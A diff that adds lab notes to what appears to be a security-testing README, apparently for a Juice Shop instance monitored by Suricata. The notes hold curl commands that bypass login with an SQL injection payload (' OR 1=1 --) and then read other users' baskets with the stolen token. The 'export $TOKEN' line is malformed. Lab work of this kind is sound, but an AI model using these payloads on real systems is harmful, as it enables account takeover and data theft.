@@ -48,3 +48,16 @@ sudo suricata -c /etc/suricata/suricata.yaml -q 0
 ```
 
 ## Vulnerabilities
+
+### A01:2021 Broken Access Control
+
+```bash
+curl -s -X POST "http://172.20.0.106:3000/rest/user/login" \
+  -H "Content-Type: application/json" \
+  -d "{\"email\":\"' OR 1=1 --\",\"password\":\"any\"}" | jq -r '.authentication.token'
+
+export $TOKEN=...
+
+curl -H "Authorization: Bearer $TOKEN" "http://172.20.0.106:3000/rest/basket/1" | jq
+curl -H "Authorization: Bearer $TOKEN" "http://172.20.0.106:3000/rest/basket/2" | jq
+```
